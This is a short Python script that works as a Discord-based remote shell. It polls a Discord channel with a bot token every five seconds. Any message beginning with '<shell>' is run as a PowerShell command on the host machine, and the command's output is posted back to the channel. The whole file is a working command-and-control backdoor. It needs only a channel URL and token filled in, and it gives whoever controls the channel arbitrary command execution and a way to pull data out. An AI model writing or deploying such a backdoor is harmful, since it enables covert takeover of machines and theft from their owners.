import time
import requests
import subprocess


url = "<DISCORD_CHANNEL_URL>"
discord_token = "<DISCORD_BOT_TOKEN>"

headers = {
    "Authorization": discord_token
}

while True:
    time.sleep(5)
    response = requests.get(url + "?limit=1", headers=headers)

    if response.status_code == 200:
        message_data = response.json()

        if message_data[0]["content"].startswith("<shell>"):
            print(f"shell is >> {message_data[0]["content"][7:]}")

            result = subprocess.run(["powershell", "-Command", message_data[0]["content"][7:]], capture_output=True, text=True)

            payload = {
                "content" : result.stdout
            }

            requests.post(url, payload, headers=headers)
